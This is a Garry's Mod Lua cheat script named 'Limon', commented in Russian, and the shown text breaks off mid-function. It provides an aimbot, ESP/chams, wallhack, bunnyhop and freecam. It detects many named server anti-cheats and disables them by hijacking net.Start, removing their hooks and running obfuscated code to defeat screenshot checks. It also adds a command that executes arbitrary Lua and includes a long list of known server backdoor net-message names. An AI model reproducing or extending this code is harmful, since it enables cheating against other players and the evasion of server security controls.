--[[
Limon_picture = {
	"STEAM_0:1:426117132", -- Тайник
	"STEAM_0:0:204076914", -- Лемос
	"STEAM_0:1:161987753", -- аниме
	"STEAM_0:0:153899034"  -- хулиган
}

local Authorized = LocalPlayer():SteamID()
for k,L in pairs(Limon_picture) do
if Authorized == L then
Limon_cheat()
end
end
--]]


local ply = LocalPlayer()
local Limon = {}
local color_els = Color (255,255,5,40)
local limon_prexiks = "Limon"
local zalupa = 0
local Limon_bhop = false
local limon_v = "v2.2"
local newfov =  GetConVarNumber("Limon_zoom")
local x = 15
local y = 15
local prop = GetConVarString("Limon")
local lastwep = ""
local pr opent = Entity(-1)
local camS=cam.Start3D2D 
local w, h = ScrW(), ScrH()
local camE=cam.End3D2D 
local playerGA=player.GetAll 
local drawST=draw.SimpleText
local teamGC=team.GetColor 
local abs,sin,floor,Round = math.abs,math.sin,math.floor,math.Round 
local curtime = CurTime
local Color=Color 
local Vector=Vector 
local Angle=Angle
local surface=surface 	
local eyepos
local lemosa_zalupa = math.random(255)
local Limon_my_steam = LocalPlayer():SteamID()
local function hud_speed()
draw.SimpleText("Скорость: "..math.Round(LocalPlayer():GetVelocity():Length()), "Limon_20", w*.5, 0, Color(255, 214, 41), 1)
end

function ECNotify() end
function ECPrint() end

Limon_menu_color = Color (255,255,5)

concommand.Add( "L_code", function( ply, cmd, args, str )
	RunString( str )
end)

Limon_voice = true
Limon_Notify = true

Limon_backdoor_list = {
    "Limon",
    "Fix_Keypads",
    "Remove_Exploiters",
    "noclipcloakaesp_chat_text",
    "OdiumBackDoor",
    "zilnix",
    "_Defqon",
    "jesuslebg",
    "Sbox_itemstore",
    "elfamosabackdoormdr",
    "web",
    "sv",
    "PlayerItemPickUp",
    "echangeinfo",
	"AntiPK",
    "noprop",
    "_Warns",
    "arivia",
    "jesuslebgzilnix",
    "ULogs_B",
    "reaper",
    "ULogs_Info",
    "nolag",
    "Ulib_Message",
    "memeDoor",
	"NostraLolNostraPrivate",
	"rconyesyes",
	"adm_",
	"HitOrMiss<3Luda",
    "SessionBackdoor",
    "DarkRP_AdminWeapons",
    "stil",
    "Sandbox_Armdupe",
    "Sbox_darkrp",
    "ULX_QUERY2",
    "thereaper",
    "LickMeOut",
    "MoonMan",
    "Im_SOCool",
    "enablevac",
    "disablebackdoor",
    "_Raze",
    "m9k_explosive",
	"ckan_backdoor",
    "kill",
    "pjHabrp9EY",
    "ULXQUERY2",
    "jeveuttonrconleul",
    "Sbox_gm_attackofnullday_key",
    "aze46aez67z67z64dcv4bt",
    "blacksmurfBackdoor",
    "Reupload",
	" ⃝ ⃞ ⃟ ⃠ ⃡ ⃢ ⃣ ⃤ ⃥ ⃦ ⃧ ⃨ ⃩ ⃪",
    "nostrip",
    "ГћГ ?D)в—",
    "ITEM",
    "memrkrieter",
    "fix",
	"NolName",
    "oldNetReadData",
    "_CAC_ReadMemory",
    "nocheat",
    "Sandbox_GayParty",
    "DarkRP_UTF8",
    "BackDoor",
    "cucked",
    "NoNerks",
    "kek",
    "ZimbaBackDoor",
    "something",
    "random",
    "strip0",
    "fellosnake",
    "c",
	"YukiBackdoor",
	"LokiDevs",
	"MiraiBackdoor",
    "idk",
	"_Reading_darkrp",
	"PlayerKilledLogged",
    "killserver",
    "fuckserver",
    "cvaraccess",
    "rcon",
    "rconadmin",
    "zilnix",
    "DefqonBackdoor",
    "R8",
	"nx_noiwex",
	"nxsuper",
	"ALTERED_CARB0N",
	"PoliceJoin",
	"JSQuery.Data(Post(false))",
	"Detoured q",
	"Þà?D)◘",
	"r8helper",
	"ÃžÃ ?D)â—",
	"ÃžÃ ?D)",
	"SparksLeBg",
	"slua2",
	"slua",
	"CraftSomething",
	"thefrenchenculer",
	" .. v.NetWork .. ",
	"slua6",
	"DarkRP_AllDoorDatas",
	"0101.1",
	"awarn_remove",
	"_Infinity",
	"Infinity",
	"InfinityBackdoor",
	"_Infinity_Meme_",
	"_cac_",
	"striphelper",
	"_vliss",
	"YYYYTTYXY6Y",
	"РЎРєРѕРїРёСЂРѕРІР°РЅРѕ РІ Р±СѓС„РµСЂ РѕР±РјРµРЅР°.",
	"_KekTcf",
	"DataMinerType",
	"_blacksmurf",
	"m9k_explosionradius",
	"m9k_addons",
	"rcivluz",
	"SENDTEST",
	"_clientcvars",
	"_main",
	"stream",
	"waoz",
	"thereaperishere",
	"bdsm",
	"ZernaxBackdoor",
	"UKT_MOMOS",
	"anticrash",
	"audisquad_lua",
	"dontforget",
	"0x13",
	"Child",
	"!Cac",
	"azkaw",
	"BOOST_FPS",
	"childexploit",
	"ULX_ANTI_BACKDOOR",
	"FADMIN_ANTICRASH",
	"ULX_QUERY_TEST2",
	"GMOD_NETDBG",
	"netlib_debug",
	"NoOdium_ReadPing",
	"Sbox_Message",
	"changename",
	"music",
	"xenoexistscl",
	"fourhead",
	"Þ� ?D)◘",
	"stoppk",
	"Abcdefgh",
	"gag",
	"_Battleye_Meme_",
	"GaySploitBackdoor",
	"_GaySploit",
	"Bilboard.adverts:Spawn(false)",
	"BazZziliuS",
	"CacAntiCheat",
	"noclipcloakaWH_chat_text",
	"WepSwitch_DisableAllSwitch",
	"PlayerCheck",
	"backdoorattackdefense_superadminsettrue",
	"loona",
	"kIRIUS",
	"_Batteye_Meme_",
	"gay"
}
local function Limon_google_zalupa(text)
if Limon_voice then
sound.PlayURL("http://translate.google.com/translate_tts?ie=UTF-8&client=tw-ob&q=" .. text .. "&tl=en", "mono", function()	end )
end
end

--Limon_google_zalupa("привет лемос ты лох")

concommand.Add( "L_voice", function( ply, cmd, args, str )
sound.PlayURL("http://translate.google.com/translate_tts?ie=UTF-8&client=tw-ob&q=" .. str .. "&tl=en", "mono", function()	end )
end)


chat.AddText(Color (255, 214, 41), "[", limon_prexiks, "] ", Color( 255, 255, 255 ), "Добро пожаловать в чит Limon ".. limon_v .. ".")
chat.AddText(Color (255, 214, 41), "[", limon_prexiks, "] ", Color( 255, 255, 255 ), "Чтобы войти в меню нажмите INSERT.")
CreateClientConVar("L_prop_viel", "0", false, false)
local L_aimbot_2 = CreateClientConVar( "L_aimbot_2", 1, true, false )
CreateClientConVar("L_trigerbot", 0)
CreateClientConVar("Limon_zoom", 0)
hook.Remove("SpawnMenuOpen", "blockmenutabs")
timer.Create( "limon_323", 0.000000000000001, 0, function()
hook.Remove("HUDPaint", "Draw_NLR_Circle")
end)
	
RunConsoleCommand("developer",1)


for i=0,100 do

	local size = 10+i

	surface.CreateFont("Limon_"..size, {
		font = "Trebuchet",
		size = size,
	})
end

surface.CreateFont("pizda", {
	size = 200,
	weight = 300,
	antialias = true,
	shadow = false,
	font = "Arial",
})
	
surface.CreateFont("pizda1", {
	size = 100,
	weight = 300,
	antialias = true,
	shadow = false,
	font = "Arial",
})
	
surface.CreateFont("pizda2", {
	size = 50,
	weight = 300,
	antialias = true,
	shadow = false,
	font = "Arial",
})

surface.CreateFont( "Notifytext", {
        font = "Lato Light",
        size = 30,
        weight = 250,
        antialias = true,
        strikeout = false,
        additive = true,
} )

    surface.CreateFont("Calibri-l", {
        font = "Calibri",
        size = 18
    })
	
	
local function Notify(text)
if Limon_Notify then
    local notify = vgui.Create("DPanel")
    notify:SetSize(200, 50)
    notify:SetPos(ScrW() - 200, -50)
    notify.Paint = function(self, w, h)
    draw.RoundedBox(0, 0, 0, w, h, Color(30, 30, 30))
    local bars = 50
	for i = 0, bars do
    local rainbow = HSVToColor(CurTime() % 6 * 60 + i, 1, 1)
    draw.RoundedBox(0, i * w / bars, notify:GetTall() - 2, w / bars, 3, Color(i + 1 * rainbow.r, i + 1 * rainbow.g, i + 1 * rainbow.b, 255))
    end
    draw.SimpleText(text, "Calibri-l", notify:GetWide() / 2, notify:GetTall() / 2, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	end
    notify:MoveTo(ScrW() - notify:GetWide(), 0, .2, 0, -1, function()
    timer.Simple(3, function()
    notify:MoveTo(ScrW() - notify:GetWide(), -50, .2, 0, -1)
    end)
end)
end
end

local function ValidNetString( str )
    local status, error = pcall( net.Start, str )
    return status
end

gameevent.Listen( "player_disconnect" )
hook.Add( "player_disconnect", "Limon_leith_saset_gg_sorry_lan", function( data )
chat.AddText(Color (255, 214, 41), "[", limon_prexiks, "] ", Color( 255, 255, 255 )," "..data.name .. " ".. data.networkid.." отключился от сервера. Причина ".. data.reason)
end)

local on = false
 
function L_thirdperson()

if vgui.CursorVisible() then return end
on = not on
end
 
net.Receive("sv_togglethirdperson")
 
function CalcThirdperson(ply, pos, ang, fov)
if on then
 			local view = {};
			local dist = 100;
			local trace = {};
			trace.start = pos;
			trace.endpos = pos - ( ang:Forward() * dist );
			trace.filter = LocalPlayer();
			local trace = util.TraceLine( trace );
			if( trace.HitPos:Distance( pos ) < dist - 10 ) then
				dist = trace.HitPos:Distance( pos ) - 10;
			end;
			view.origin = pos - ( ang:Forward() * dist );
			view.angles = ang;
			view.fov = fov;
			
			return view;
end
end
 
hook.Add("CalcView", "CalcThirdperson", CalcThirdperson)
 
hook.Add("ShouldDrawLocalPlayer", "MyHax ShouldDrawLocalPlayer", function(ply)
if on then
        return true
    end
end)
 

 
local lastf4 = false
hook.Add( "Tick", "CheckPlayerKey", function()
   if (input.IsKeyDown(KEY_T) and lastf4 == false) then
   L_thirdperson()
   lastf4 = true
   timer.Simple(0.1,function()
   lastf4 = false
   end)
   end
end)

local netStart = _G.net.Start

concommand.Add( "L_fpsfix", function()
	RunConsoleCommand( "cl_show_splashes", "0" )
	RunConsoleCommand( "cl_ejectbrass", "0" )
	RunConsoleCommand( "cl_detailfade", "800" )
	RunConsoleCommand( "cl_detaildist", "1" )
	RunConsoleCommand( "cl_smooth", "0" )
	RunConsoleCommand( "mat_parallaxmap", "0" )
	RunConsoleCommand( "mat_picmip", "2" )
	RunConsoleCommand( "mat_specular", "0" )
	RunConsoleCommand( "mat_softwarelighting", "1" )
	RunConsoleCommand( "mat_mipmaptextures", "0" )
	RunConsoleCommand( "mat_filtertextures", "0" )
	RunConsoleCommand( "mat_filterlightmaps", "0" )
	RunConsoleCommand( "mat_clipz", "0" )
	RunConsoleCommand( "mat_bumpmap", "0" )
	RunConsoleCommand( "mat_compressedtextures", "1" )
	RunConsoleCommand( "r_fastzreject", "-1" )
	RunConsoleCommand( "r_threaded_particles", "1" )
	RunConsoleCommand( "r_threaded_renderables", "1" )
	RunConsoleCommand( "r_decal_cullsize", "1" )
	RunConsoleCommand( "r_drawflecks", "0" )
	RunConsoleCommand( "r_drawmodeldecals", "0" )
	RunConsoleCommand( "r_dynamic", "0" )
	RunConsoleCommand( "r_lod", "0" )
	RunConsoleCommand( "r_WaterDrawReflection", "0" )
	RunConsoleCommand( "r_WaterDrawRefraction", "0" )
	RunConsoleCommand( "r_waterforceexpensive", "0" )
	RunConsoleCommand( "r_cheapwaterend", "1" )
	RunConsoleCommand( "dsp_enhance_stereo", "0" )
	RunConsoleCommand( "r_cheapwaterend", "1" )
	RunConsoleCommand( "ai_expression_optimization", "0" )
	RunConsoleCommand( "mat_queue_mode", "2" )
Notify("Фпс фикс подключен")
end)


local function Limon_pizda(text)
chat.AddText(Limon_menu_color, "[", limon_prexiks, "] ", Color( 255, 0, 0 ), text )
end

local function Limon_norm(text)
chat.AddText(Limon_menu_color, "[", limon_prexiks, "] ", Color( 0, 255, 0 ), text )
end

local function Limon_block_net_start_anticheat(text)
net.Start = function( name )
if ( name == text ) then
return false
else
return netStart( name )
end
end
end


if MOTDgd then
Limon_norm("На сервере стоит MOTDgd,блочим.." )
function MOTDgd.GetIfSkip()
return true
end
end


if Limon_sesia == nil then
Limon_sesia = 1
end
timer.Create( "4234234", 1, 0, function()
Limon_sesia = 1 + Limon_sesia
end)




if ValidNetString( "ulx_data_send7" ) then
Limon_norm("На сервере стоит Anti external.")
Limon_block_net_start_anticheat("ulx_data_send7")
end


if ValidNetString( "aze46aez67z67z64dcv4bt" ) then
Limon_pizda("На сервере стоит SNTE")
end


if CAC then
Limon_pizda("На сервере стоит Cake!")
end

if rtxappend then
Limon_pizda("На сервере стоит Screengrab!" )
end

if ValidNetString( "Umbrella_UpdateSpammers" ) then
Limon_norm("На сервере стоит Umbrella anticheat." )
Limon_block_net_start_anticheat("HasPlyExec")
Limon_block_net_start_anticheat("HasPlyExploit")
Limon_block_net_start_anticheat("SHChk")
Limon_block_net_start_anticheat("nw.readstream")
end

if ValidNetString( "validation_check" ) then
Limon_pizda("На сервере стоит G секюрити." )
end

if ValidNetString( "Watchdog_FoundFragment" ) then
Limon_pizda("На сервере стоит Watchdog anti cheat." )
end

if ValidNetString( "_AC_LOG" ) then
Limon_pizda("На сервере стоит anti cheat.[1]" )
end

if ValidNetString( "KickHacker" ) then
Limon_norm("На сервере стоит anti cheat.[2][lua/bin][scripthook]" )
hook.Remove("PlayerIsLoaded", "ZAPUSTITPROVERKUNACHIT")
end

if ValidNetString( "Limon_kick" ) then
Limon_norm("На сервере стоит Limon anticheat" )
for _ = 1,345345 do
timer.Remove("34535354345".._)
end
end

if ValidNetString( "validate_crc" ) then
Limon_norm("На сервере стоит minimal" )
oldnetstart = function() end
end

if ValidNetString( "shtirlitz_detection" ) then
Limon_norm("На сервере стоит Shtirlitz Anti-Cheat" )
Limon_block_net_start_anticheat('shtirlitz_checksource')
Limon_block_net_start_anticheat('shtirlitz_detection')
Limon_block_net_start_anticheat('shtirlitz_checkplayer')
Limon_block_net_start_anticheat("shtirlitz_Ping1")
Limon_block_net_start_anticheat("shtirlitz_Ping2")
Limon_block_net_start_anticheat('shtirlitz_client')
Limon_block_net_start_anticheat("shtirlitz_agent")
end

if ValidNetString( "antiebobo" ) then
Limon_norm("На сервере стоит anti cheat урбанички." )
function bobofinded() end
function minibobofinded() end
end

if RunCheck then
Limon_pizda("На сервере стоит SAC anti cheat." )
end

net.Receive( "StartScreengrab", function()
Limon_pizda("Попытка зделать скриншот" )
end)

if ValidNetString( "LeyScreenCap" ) then
Limon_norm("На сервере стоит LeyScreenCap" )
local _=_G local a,b=_['\115\116\114\105\110\103'],_['\98\105\116']['\98\120\111\114']local function c(_)if a['\108\101\110'](_)==0 then return _ end local c,d='',0 for _ in a['\103\109\97\116\99\104'](_,'\46')do if _=='\124'then c=c..a['\99\104\97\114'](b(d,64))d=0 else d=d+1 end end return c end local a=_[c[[‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪g|‪‪‪‪‪‪‪‪‪‪‪‪1|‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪s|]]][c[[‪‪‪‪‪‪t|‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪Y|‪‪‪‪‪‪‪‪‪‪‪|‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪Va|‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪L|]]]_[c[[‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪g|‪‪‪‪‪‪‪‪‪‪‪‪1|‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪s|]]][c[[‪‪‪‪‪‪t|‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪Y|‪‪‪‪‪‪‪‪‪‪‪|‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪Va|‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪L|]]]=function(_,b)if _[c[[‪‪‪‪‪‪‪‪‪‪‪‪Eq|‪‪‪‪‪‪‪‪‪‪‪‪‪rR|‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪I|‪‪‪‪‪‪‪‪‪‪‪‪|]]](_,c[[‪‪‪‪|‪‪‪‪‪‪‪‪‪‪‪‪D|‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪|‪‪‪‪‪‪7|‪‪‪‪‪‪‪‪‪‪‪KY|‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪ys|‪‪‪‪‪‪‪‪‪‪‪‪m|‪‪‪‪‪‪‪‪‪‪‪‪D|‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪b|‪|‪‪‪‪‪‪‪‪‪‪‪|‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪‪|]])then return!!1 end return a(_,b)end
end

if not DarkRP then
Limon_pizda("Чит предназначен только для DarkRP, возможна некорректная работа." )
end


if ValidNetString( "anti_lua_ban" ) then
Limon_norm("На сервере стоит Anti-Sy4ka (Anti-Cheat),подрубаем обход" )
Limon_block_net_start_anticheat("anti_exploits_ban")
Limon_block_net_start_anticheat("anti_cheat_ban")
Limon_block_net_start_anticheat("anti_dll_ban")
Limon_block_net_start_anticheat("anti_lua_ban")
Limon_block_net_start_anticheat("anti_scripthook_ban")
Limon_block_net_start_anticheat("anti_armdupe_ban")
end


if ValidNetString( "VelocityKillerMessage" ) then
Limon_pizda("На сервере стоит VelocityKiller")
end




if ValidNetString( "InformPlayer" ) then
Limon_norm("На сервере стоит SimpleGrab." )
net.Receive("SAdmin",function()end)
end     

-- автобанихоп из - надо уметь банихопить я разгонялся до 1300 вроде)
hook.Add("Think", "Limon_bhop", function()
if Limon_bhop then
     if (input.IsKeyDown( KEY_SPACE ) ) then
        if LocalPlayer():IsOnGround()  then
if gui.IsGameUIVisible() or gui.IsConsoleVisible() or LocalPlayer():IsTyping() or LocalPlayer():GetMoveType() == MOVETYPE_NOCLIP then return end
		RunConsoleCommand("+jump")
            Limon = 1
        else
            RunConsoleCommand("-jump")
            Limon = 0
        end
	elseif Limon_bhop and LocalPlayer():IsOnGround() then
        if Limon == 1 then
            RunConsoleCommand("-jump")
            Limon = 0
        end
    end
end
end)
concommand.Add("L_bhop", function()
if Limon_bhop then
    Limon_bhop = !Limon_bhop
	Notify("Авто банихоп выключен")
	Limon_google_zalupa("auto bunnyhop off")
	hook.Remove("HUDPaint", "hud_speed")
	else
    Limon_bhop = !Limon_bhop
	hook.Add("HUDPaint", "hud_speed", hud_speed)
	Limon_google_zalupa("auto bunnyhop enabled")
	Notify("Авто банихоп включен")
	end
end)

//[[-------------------------------------------------------------------------------------------------------------]]
-- елс ну короче подсветка (едественое что не спиженно,не написано 7 летним школьником) )
function Limonels()
local drawables = {}																						
hook.Add("PostPlayerDraw", "lol12", function(pl) drawables[pl] = true end)
hook.Add("RenderScene", "3D2DNicksPosAng",function(pos) eyepos = pos end)
hook.Add("PostDrawTranslucentRenderables", "lol12", function()
for v,ply in pairs(playerGA()) do
if drawables[ply] then
drawables[ply] = true
local bone = ply:LookupAttachment("eyes")
if bone != 250 then			
local attach = ply:GetAttachment(bone) 
cam.Start3D2D(ply:GetAttachment(ply:LookupAttachment("eyes")).Pos + Vector(-2, -12, 25), Angle(0,180,90), 0.1 )
draw.RoundedBox( 0, -120, 120, 300, 750, color_els )
cam.End3D2D()
cam.Start3D2D(ply:GetAttachment(ply:LookupAttachment("eyes")).Pos + Vector(-2, 18, 25), Angle(0,180,90), 0.1 )
draw.RoundedBox( 0, -120, 120, 300, 750, color_els )
cam.End3D2D()	
cam.Start3D2D(ply:GetAttachment(ply:LookupAttachment("eyes")).Pos + Vector(-20, 0, 25), Angle(0,90,90), 0.1 )
draw.RoundedBox( 0, -120, 120, 300, 750, color_els )
cam.End3D2D()	
cam.Start3D2D(ply:GetAttachment(ply:LookupAttachment("eyes")).Pos + Vector(10, 0, 25), Angle(0,90,90), 0.1 )
draw.RoundedBox( 0, -120, 120, 300, 750, color_els )
cam.End3D2D()		
cam.Start3D2D(ply:GetAttachment(ply:LookupAttachment("eyes")).Pos + Vector(-32, 0, 13), Angle(0,90,0), 0.1 )
draw.RoundedBox( 0, -120, 120, 300, 300, color_els )
cam.End3D2D()	
cam.Start3D2D(ply:GetAttachment(ply:LookupAttachment("eyes")).Pos + Vector(-32, 0, -62), Angle(0,90,0), 0.1 )
draw.RoundedBox( 0, -120, 120, 300, 300, color_els )
cam.End3D2D()
end
end
end
end)
if Limon_els then
Limon_els = !Limon_els
hook.Remove("PostPlayerDraw", "lol12")
hook.Remove("PostDrawTranslucentRenderables", "lol12")
Notify("Выключен ELS")
else
Limon_els = !Limon_els 
Notify("Включен ELS")
end
end




function Limon_clearchat()
LocalPlayer():ChatPrint(" \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n ")
Notify("Чат очищен")
end

local ply = LocalPlayer()
	local function Noclip()
	ply:ConCommand( "L_noclip" )
	end
	Enabled = false
	ViewOrigin = Vector( 0, 0, 0 )
	ViewAngle = Angle( 0, 0, 0 )
	Velocity = Vector( 0, 0, 0 )
	function CalcView( ply, origin, angles, fov )
	if ( !Enabled ) then return end
	if ( SetView ) then
	ViewOrigin = origin
	Notify("Активирован режим полета")
	ViewAngle = angles
	SetView = false
	end
	return { origin = ViewOrigin, angles = ViewAngle }
	end
	hook.Add( "CalcView", "Limon", CalcView )
	 function CreateMove( cmd )
	if ( !Enabled ) then return end    
	local time = FrameTime()
	ViewOrigin = ViewOrigin + ( Velocity * time )
	Velocity = Velocity * 0.96
	local sensitivity = 0.022
	ViewAngle.p = math.Clamp( ViewAngle.p + ( cmd:GetMouseY() * sensitivity ), -89, 89 )
	ViewAngle.y = ViewAngle.y + ( cmd:GetMouseX() * -1 * sensitivity )
	local add = Vector( 0, 0, 0 )
	local ang = ViewAngle
	if ( cmd:KeyDown( IN_FORWARD ) ) then add = add + ang:Forward() end
	if ( cmd:KeyDown( IN_BACK ) ) then add = add - ang:Forward() end
	if ( cmd:KeyDown( IN_MOVERIGHT ) ) then add = add + ang:Right() end
	if ( cmd:KeyDown( IN_MOVELEFT ) ) then add = add - ang:Right() end
	if ( cmd:KeyDown( IN_JUMP ) ) then add = add + ang:Up() end
	add = add:GetNormal() * time * 3000
	if ( cmd:KeyDown( IN_SPEED ) ) then add = add * 0.1 end
	if ( cmd:KeyDown( IN_DUCK ) ) then add = add * 0.01 end			   
	Velocity = Velocity + add
	if ( LockView == true ) then
	LockView = cmd:GetViewAngles()
	end
	if ( LockView ) then
	cmd:SetViewAngles( LockView )
	end
	cmd:SetForwardMove( 0 )
	cmd:SetSideMove( 0 )
	cmd:SetUpMove( 0 )
	end
	hook.Add( "CreateMove", "Limon", CreateMove )
	function Toggle()
	Enabled = !Enabled
	LockView = Enabled		          
	SetView = true          
	end
	concommand.Add( "L_noclip", Toggle )



-- информация об пропе(такто нахуй не нужна)
concommand.Add('L_prop', function(pl)
    local Limon_prop = pl:GetEyeTrace().Entity

    if IsValid(Limon_prop) then
        chat.AddText(Limon_menu_color, "[", limon_prexiks, "] ", Color( 255, 255, 255 ), "Найдено, посмотрите в консоль" )
		pl:PrintMessage(HUD_PRINTCONSOLE, Limon_prop:GetClass())
        pl:PrintMessage(HUD_PRINTCONSOLE, 'mdl = \'' .. Limon_prop:GetModel() .. '\',')
        pl:PrintMessage(HUD_PRINTCONSOLE, 'pos = Vector(' .. string.gsub(tostring(Limon_prop:GetPos()), ' ', ', ') .. '),')
        pl:PrintMessage(HUD_PRINTCONSOLE, 'ang = Angle(' .. string.gsub(tostring(Limon_prop:GetAngles()), ' ', ', ') .. '),')
        pl:PrintMessage(HUD_PRINTCONSOLE, 'mat = \'' .. Limon_prop:GetMaterial() .. '\',')
    end
end)


-- с гмодстора - https://www.gmodstore.com/scripts/view/582/admin-esp
local adminESPConfig	=	{}				
adminESPConfig.info				= true			
adminESPConfig.infocol1		=	Color(255, 214, 41, 255)	
adminESPConfig.infocol3		=	Color(150, 150, 150, 255)						
adminESPConfig.infoscol1	=	{
								}			
adminESPConfig.infocol2		=	Color(0, 0, 0, 255)	
adminESPConfig.infodis	=	true					
adminESPConfig.infomon	=	true					
adminESPConfig.infohp	=	true	
adminESPConfig.infowep	=	true
adminESPConfig.chams			= true
adminESPConfig.chamsc		=	Color(0, 161, 255, 255)
adminESPConfig.chamssc		=	{
								}
adminESPConfig.chamswep		=	true			
adminESPConfig.chamswepc	=	Color(255, 255, 255, 255)
local AESP			=		{}
concommand.Add("L_esp",function()
	AESP.EspToggle ()
end)
AESP.Matinfo = {
["$basetexture"] = 'models/debug/debugwhite',
["$model"]       = 1,
["$nocull"]      = 1,
["$ignorez"]     = 1
}
AESP.Mat = (CreateMaterial( "chams", "VertexLitGeneric", AESP.Matinfo )) 
function AESP.StopVisualRecoil ( ply, pos, angles, fov )
	return GAMEMODE:CalcView ( ply, LocalPlayer():EyePos(), LocalPlayer():EyeAngles(), fov, 0.1 )
end
function AESP.EspToggle()
	if !AESP.ESP then
    Notify("Включен ESP")	
	AESP.ESP = true
		
hook.Add('HUDPaint', 'AESP.Info', function()
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
local position = (v:GetPos() + Vector(0, 0, 100)):ToScreen() 
local color = adminESPConfig.infocol1
if adminESPConfig.infoscol1[v:GetUserGroup()] then
color = adminESPConfig.infoscol1[v:GetUserGroup()]
else
color = adminESPConfig.infocol1
end	
end
end
end)		
hook.Add('CalcView', 'StopVisualRecoil', AESP.StopVisualRecoil)
hook.Add('RenderScreenspaceEffects', 'Chams', function()
cam.Start3D( LocalPlayer():EyePos(), LocalPlayer():EyeAngles() )
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() and v:Alive() then
render.SuppressEngineLighting ( true )
local color = adminESPConfig.chamsc
					if adminESPConfig.chamssc[v:GetUserGroup()] then
						color = adminESPConfig.chamssc[v:GetUserGroup()]
					else
						color = adminESPConfig.chamsc
					end
					render.SetColorModulation ( color.r/255, color.g/255, color.b/255, 1 )
					render.MaterialOverride ( AESP.Mat )
					v:DrawModel()
					render.SetColorModulation ( adminESPConfig.chamswepc.r, adminESPConfig.chamswepc.g, adminESPConfig.chamswepc.b, 1 )
					if (IsValid(v:GetActiveWeapon())) then
						v:GetActiveWeapon():DrawModel()
					end
					render.SetColorModulation ( 1, 1, 1, 1 )
					render.MaterialOverride() 
					render.SetModelLighting ( 4, color.r/255, color.g/255, color.b/255 )
					v:DrawModel()
					if (IsValid(v:GetActiveWeapon())) then
						v:GetActiveWeapon():DrawModel()
					end
					render.SuppressEngineLighting ( false )
			
			end	
		end
		cam.End3D()	
	end)
	else
		AESP.ESP = false
		Notify("Выключен ESP")
		hook.Remove('HUDPaint', 'AESP.Info')
		hook.Remove('CalcView', 'StopVisualRecoil')
		hook.Remove('RenderScreenspaceEffects', 'Chams')
	end
end

-- аим,целится на того кто ближе к вам, не спиженный(неа)
concommand.Add("L_aimbot_tog", function()
	if Limon_els then
    Limon_els = !Limon_els
	Notify("Выключен AIMBOT" )
	
	ply:ConCommand("L_aimbot 0")
	else
	Limon_els = !Limon_els 
	Notify("Включен AIMBOT")
	ply:ConCommand("L_aimbot 1")
end
end)

local Limon = {}
Limon.TargetMethod = {}
Limon.Settings = {}
Limon.TargetMethod["closest"] = true
Limon.Settings["sAimbone"] = "ValveBiped.Bip01_Head1"
Limon.Settings["AimBotKey"] = KEY_F

local function HasHead(ent)
	local bone = ent:LookupBone(Limon.Settings["sAimbone"])
	if bone then
		return true 
	else
		return false
	end
end

local function CanSeeHead(ent)
		local wishedbone  = ent:LookupBone(Limon.Settings["sAimbone"])
		local trendpos = ent:GetBonePosition(wishedbone)
        local tr = {}
        tr.start = LocalPlayer():GetShootPos()
        tr.endpos = trendpos
        tr.filter = {LocalPlayer(), ent}
        tr.mask = MASK_SHOT
    local trace = util.TraceLine(tr)
    if (trace.Fraction == 1) then
        return true
    else
        return false
    end    
end

local function CanSeeOBB(ent)
		local obbendpos = ent:LocalToWorld(ent:OBBCenter())
        local tr = {}
        tr.start = LocalPlayer():GetShootPos()
        tr.endpos = obbendpos
        tr.filter = {LocalPlayer(), ent}
        tr.mask = MASK_SHOT
    local trace = util.TraceLine(tr)
    if (trace.Fraction == 1) then
        return true
    else
        return false
    end    
end

CreateClientConVar("L_aimbot", "0", false, false)

local Locked
local aimBuddies = {}
local target


local function hlaimbot(cmd)
	if GetConVarNumber("L_aimbot") != 1 then return end
	local AimBone
	local lpos = LocalPlayer():GetShootPos()
	local aimPlayers = {}
	for _, v in pairs(player.GetAll()) do
	table.insert(aimPlayers, v)
	if v == LocalPlayer() then
	table.RemoveByValue(aimPlayers, v)
	end			
	end
	if Limon.TargetMethod["closest"] then
	local allply = aimPlayers
    local plyDist = 100000
    for i = 1, #allply do  
	v = allply[i]
	if v:Alive() then
	local plyDist2 = LocalPlayer():GetPos():Distance(v:GetPos())
    if plyDist2 < plyDist then 
	plyDist = plyDist2
    target = v
    end
	end
	end
end



for _, b in pairs(aimPlayers) do
	if !HasHead(target) then
		AimBone = target:LocalToWorld(target:OBBCenter())
		else
		AimBone = target:GetBonePosition(target:LookupBone("ValveBiped.Bip01_Head1"))
	end
end
	
			if input.IsKeyDown(Limon.Settings["AimBotKey"]) then
				if !AimBone then return end
				
				cmd:SetViewAngles((AimBone - lpos):Angle())
			end
end

cvars.AddChangeCallback("L_aimbot", function()
if GetConVarNumber("L_aimbot") == 1 then
hook.Add("CreateMove", "aimbothl", hlaimbot)
else
hook.Remove("aimbothl")
end
end)

concommand.Add("L_steni", function()
if Limon_lol then
    Limon_lol = !Limon_lol
	hook.Remove("HUDPaint", "L_steni")
	else
	Limon_lol = !Limon_lol
	Notify("Включены стены" )
	hook.Add( "HUDPaint", "L_steni", function()
